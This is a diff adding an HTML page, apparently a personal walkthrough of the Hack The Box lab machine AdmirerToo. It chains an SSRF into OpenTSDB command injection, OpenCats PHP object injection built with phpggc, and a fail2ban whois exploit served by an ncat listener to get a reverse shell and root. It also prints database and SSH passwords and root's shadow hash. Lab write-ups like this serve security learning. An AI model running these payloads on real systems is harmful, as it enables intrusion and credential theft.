@@ -1,0 +1,318 @@
+<!doctype html>
+<html>
+
+<head>
+  <!DOCTYPE html>
+  <html>
+
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE-edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+    <title>test</title>
+    <link rel="stylesheet" href="../../../../css/style.css" />
+    <style>
+      h1 {
+        color: #00ff00;
+        /* change the color of the main heading */
+      }
+
+      h3 {
+        color: #ff00ff;
+        /* change the color of the subheadings */
+      }
+
+      a {
+        color: #ffffff;
+        /* change the color of the links */
+        text-decoration: none;
+        /* remove underlines from links */
+      }
+    </style>
+  </head>
+</head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FJB1G27CWD"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FJB1G27CWD');
+</script>
+<body>
+  <header class="writeups">
+    <h1 class="textHeading3">AdmireTwo</h1>
+  <div class='writeupNotes'>
+    <p><img src="images/398-1.png" alt="images/398-1.png" /></p>
+    <p>Intresting Links I found: </p>
+    <p><a
+        href="https://github.com/c0rnf13ld/HackTheBox-scripts-autopwn/tree/master/AdmirerToo/autopwn">https://github.com/c0rnf13ld/HackTheBox-scripts-autopwn/tree/master/AdmirerToo/autopwn</a>
+    </p>
+  </div>
+  <div class='writeupNotes'>
+    <h1>nmap</h1><br />
+    <p>PORT      STATE    SERVICE </p>
+    <p>22/tcp    open     ssh </p>
+    <p>80/tcp    open     http </p>
+    <p><span style="background-color:#bf3f3f;">4242/tcp  filtered vrml-multi-use </span><span
+        style="background-color:#bf3f3f;"></span></p>
+    <p><span style="background-color:#bf3f3f;">16010/tcp filtered unknown </span><span
+        style="background-color:#bf3f3f;"></span></p>
+    <p><span style="background-color:#bf3f3f;">16030/tcp filtered unknown</span></p>
+    <p> </p>
+    <p></p>
+    <p>PORT STATE SERVICE VERSION</p>
+    <p>22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</p>
+    <p>| ssh-hostkey: </p>
+    <p>| 2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)</p>
+    <p>| 256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)</p>
+    <p>|_ 256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)</p>
+    <p>80/tcp open http Apache httpd 2.4.38 ((Debian))</p>
+    <p>| http-methods: </p>
+    <p>|_ Supported Methods: GET HEAD POST OPTIONS</p>
+    <p>|_http-title: Admirer</p>
+    <p>|_http-server-header: Apache/2.4.38 (Debian)</p>
+    <p>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+  </div>
+  <div class='writeupNotes'>
+    <h1 class='title level-2'>Enum</h1><br />
+    <p><img src="images/404-1.png" alt="images/404-1.png" /></p>
+    <p></p>
+    <p><img src="images/404-2.png" alt="images/404-2.png" /></p>
+    <p></p>
+    <p>lets check for an exploit </p>
+    <p><a
+        href="https://www.cvedetails.com/vulnerability-list/vendor_id-18666/product_id-47794/Opentsdb-Opentsdb.html">https://www.cvedetails.com/vulnerability-list/vendor_id-18666/product_id-47794/Opentsdb-Opentsdb.html</a>
+    </p>
+    <p>thers an RCE in version number 2.4.0</p>
+    <p><img src="images/404-3.png" alt="images/404-3.png" /></p>
+    <p><img src="images/404-4.png" alt="images/404-4.png" /></p>
+    <p></p>
+    <p>Now lets check for the version number. </p>
+    <p><img src="images/404-5.png" alt="images/404-5.png" /></p>
+    <p></p>
+    <p>Open Burp and turn on proxy </p>
+    <p><img src="images/404-6.png" alt="images/404-6.png" /></p>
+    <p></p>
+    <p>Now check out burp </p>
+    <p></p>
+    <p><img src="images/404-7.png" alt="images/404-7.png" /></p>
+    <p></p>
+    <p>change the server to elastic and localhost to our machine, send it. </p>
+    <p><img src="images/404-8.png" alt="images/404-8.png" /></p>
+    <p></p>
+    <p>we have confermation the version number is 2.4.0 also we have a name maybe we can use it for ssh hobbes</p>
+    <p></p>
+    <p><a
+        href="https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/cves/2020/CVE-2020-35476.yaml">https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/cves/2020/CVE-2020-35476.yaml</a>
+    </p>
+    <p></p>
+    <p><a href="https://github.com/OpenTSDB/opentsdb/issues/2051">https://github.com/OpenTSDB/opentsdb/issues/2051</a>
+    </p>
+    <p></p>
+    <p></p>
+    <p>PoC:</p>
+    <p></p>
+    <p>
+      http://opentsdbhost.local/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(&#39;touch/tmp/poc.txt&#39;)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
+    </p>
+    <p></p>
+    <p><img src="images/404-9.png" alt="images/404-9.png" /></p>
+    <p></p>
+    <p></p>
+    <p><span style="color:#1f1f1f;">python3 ssrf_redirect.py 80
+        &#39;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=</span><strong><span
+          style="color:#1f1f1f;">[</span></strong><span style="color:#1f1f1f;">33:system</span><strong><span
+          style="color:#1f1f1f;">(</span></strong><span
+        style="color:#1f1f1f;">%27%70%69%6e%67%20%2d%63%20%34%20%31%30%2e%31%30%2e%31%31%2e%31%33%37%27</span><strong><span
+          style="color:#1f1f1f;">)]</span></strong><span
+        style="color:#1f1f1f;">&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json&#39;</span></p>
+    <p></p>
+    <p></p>
+    <p><img src="images/404-10.png" alt="images/404-10.png" /></p>
+    <p></p>
+    <p>lets check for metrics that we have in our server </p>
+    <p></p>
+    <p><img src="images/404-11.png" alt="images/404-11.png" /> <img src="images/404-12.png" alt="images/404-12.png" />
+    </p>
+    <p></p>
+    <p></p>
+    <p></p>
+    <p>MySQL server Username/Password</p>
+    <p>/* Database configuration. */ </p>
+    <p>define(&#39;DATABASE_USER&#39;, &#39;<span style="background-color:#bf3f3f;">cats</span>&#39;); </p>
+    <p>define(&#39;DATABASE_PASS&#39;, &#39;<span style="background-color:#bf3f3f;">adm1r3r0fc4ts</span>&#39;); </p>
+    <p>define(&#39;DATABASE_HOST&#39;, &#39;localhost&#39;); </p>
+    <p>define(&#39;DATABASE_NAME&#39;, &#39;cats_dev&#39;);</p>
+    <p> </p>
+    <p>bQ3u7^AxzcB7qAsxE3 : jennifer</p>
+    <p></p>
+    <p><img src="images/404-13.png" alt="images/404-13.png" /></p>
+    <p></p>
+    <p></p>
+  </div>
+  <div class='writeupNotes'>
+    <h1 class='title level-3'>root</h1><br />
+    <p><img src="images/406-1.png" alt="images/406-1.png" /></p>
+    <p></p>
+    <p>Lets see whats inside cats_dev database</p>
+    <p><span style="background-color:#bf3f3f;">show tables;</span></p>
+    <p> </p>
+    <p>inside user tables </p>
+    <p><span style="background-color:#bf3f3f;">explain user;</span></p>
+    <p> </p>
+    <p>we have user_id, user_name,password</p>
+    <p></p>
+    <p><img src="images/406-2.png" alt="images/406-2.png" /></p>
+    <p></p>
+    <p></p>
+    <p>we can change admin password as well </p>
+    <p></p>
+    <p>first lets echo a password to md5 string. </p>
+    <p><img src="images/406-3.png" alt="images/406-3.png" /></p>
+    <p></p>
+    <p><img src="images/406-4.png" alt="images/406-4.png" /></p>
+    <p></p>
+    <p><span style="background-color:#bf3f3f;">systemctl list-units --type=service</span></p>
+    <p>looking around in the services we can see <span style="background-color:#bf3f3f;">fail2ban</span> </p>
+    <p></p>
+    <p>8080 using this service </p>
+    <p>since we have ssh password we can now do port forwarding to more forward. </p>
+    <p></p>
+    <p><span style="color:#18b218;background-color:#000000;">ssh</span><span style="background-color:#000000;">
+      </span><span style="color:#b218b2;background-color:#000000;">-L</span><span style="background-color:#000000;">
+        8081:127.0.0.1:8080 jennifer@10.10.11.137 </span><span
+        style="color:#b218b2;background-color:#000000;">-N</span><span style="background-color:#000000;"> </span><span
+        style="color:#b218b2;background-color:#000000;">-v</span></p>
+    <p></p>
+    <p><img src="images/406-5.png" alt="images/406-5.png" /></p>
+    <p></p>
+    <p>using the password we just made we can log in as admin </p>
+    <p></p>
+    <p>OpenCats is running on 9.5.2 and I found an exploit. </p>
+    <p></p>
+    <p><a
+        href="https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html">https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html</a>
+    </p>
+    <p></p>
+    <p>With this we can do a file write on the system, and try to get a RCE. </p>
+    <p>After tring to see who is the user that is running this service, I found that it is devel. </p>
+    <p></p>
+    <p>and devel those not have shell... </p>
+    <p></p>
+    <p>further enum.</p>
+    <p><a
+        href="https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm">https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm</a>
+    </p>
+    <p></p>
+    <p>I found that maybe with this older version of fail2ban we can actually get a RCE by executing a whois for our
+      machine and executing a rev shell. </p>
+    <p></p>
+    <p>poc was in the link. since we can write in the folder /usr/local/etc/ </p>
+    <p>we can use the opencats LFI to write a whois lookup. </p>
+    <p></p>
+    <p>first we create a whois.conf in our local machine in /usr/local/etc/whois.conf the contents of this file dont
+      have to be anything. </p>
+    <p><img src="images/406-6.png" alt="images/406-6.png" /></p>
+    <p></p>
+    <p>next we need to create a payload </p>
+    <p><img src="images/406-7.png" alt="images/406-7.png" /></p>
+    <p></p>
+    <p><a
+        href="http://localhost:8081/vendor/composer/installed.json">http://localhost:8081/vendor/composer/installed.json</a>
+    </p>
+    <p>looking at vendors </p>
+    <p><img src="images/406-8.png" alt="images/406-8.png" /></p>
+    <p>we can see its using guzzle</p>
+    <p></p>
+    <p><span style="color:#18b218;">phpggc</span> <span style="color:#b218b2;">-u</span> <span
+        style="color:#b218b2;">--fast-destruct</span> Guzzle/FW1 /usr/local/etc/whois.conf /root/pwnd </p>
+    <p></p>
+    <p><img src="images/406-9.png" alt="images/406-9.png" /></p>
+    <p></p>
+    <p>now we can replace all the strings fron burp suite with this payload we just created. </p>
+    <p></p>
+    <p><img src="images/406-10.png" alt="images/406-10.png" /></p>
+    <p></p>
+    <p></p>
+    <p>After sending that request I have a ssh session open and you can see that we have a whois.conf file on the system
+      now. </p>
+    <p></p>
+    <p><img src="images/406-11.png" alt="images/406-11.png" /></p>
+    <p></p>
+    <p>Now we are ready to exploit </p>
+    <p></p>
+    <p>creat a shell </p>
+    <p><img src="images/406-12.png" alt="images/406-12.png" /></p>
+    <p></p>
+    <p><span style="color:#18b218;">ncat</span> <span style="color:#b218b2;">-nvlkp</span> 43 <span
+        style="color:#b218b2;">-c</span> <span style="color:#b26818;">&#39;cat /root/shell&#39;</span></p>
+    <p><img src="images/406-13.png" alt="images/406-13.png" /></p>
+    <p>We can use ncat to connect to port 43 for whois look up and have it execute the shell when jennifer execute the
+      command whois</p>
+    <p></p>
+    <p><img src="images/406-14.png" alt="images/406-14.png" /></p>
+    <p>whois &lt;YourTun0Ip&gt;</p>
+    <p></p>
+    <p>Now we are ready to exploit. </p>
+    <p></p>
+    <p>Start a nc listener.</p>
+    <p><span style="color:#18b218;">nc</span> <span style="color:#b218b2;">-nlvp</span> 9001</p>
+    <p></p>
+    <p><img src="images/406-15.png" alt="images/406-15.png" /></p>
+    <p></p>
+    <p><img src="images/406-16.png" alt="images/406-16.png" /></p>
+    <p>Type in the wrong password. </p>
+    <p></p>
+    <p><img src="images/406-17.png" alt="images/406-17.png" /></p>
+    <p></p>
+    <p>Root =)</p>
+    <p></p>
+    <p>
+      root:$6$eP5MVyB1lXtVQgzU$H4xJdGiHfSu9JmUR80juqHC5BAca79yir2Z6bipW8s.DowTuNRo82/CjN7EMBK8lczD1AMYxgKTIp79DjN2R31:18817:0:99999:7:::
+    </p>
+    <p> </p>
+    <p></p>
+    <p></p>
+    <p></p>
+    <p></p>
+    <p></p>
+    <p></p>
+    <p></p>
+    <p></p>
+    <p></p>
+    <p></p>
+    <p> </p>
+    <p></p>
+    <p></p>
+    <p> </p>
+    <p></p>
+    <p></p>
+  </div> 
+
+
+<footer class="footerWithContact2">
+  <div class="contactMe">
+    <!-- Footer content here -->
+    <div>Contact Me
+      
+    </div>
+  </div>
+  <div >
+    <div>
+    <a href="https://twitter.com/AnonHack3r" class="DM">
+    <span>
+      Direct Message on Twitter
+    </span>
+  </div>
+</div>
+  <div></div>
+  </div>
+  <div></div>
+</footer>
+
+<script src="../../../../js/main.js"></script>
+</body>
+
+</html>
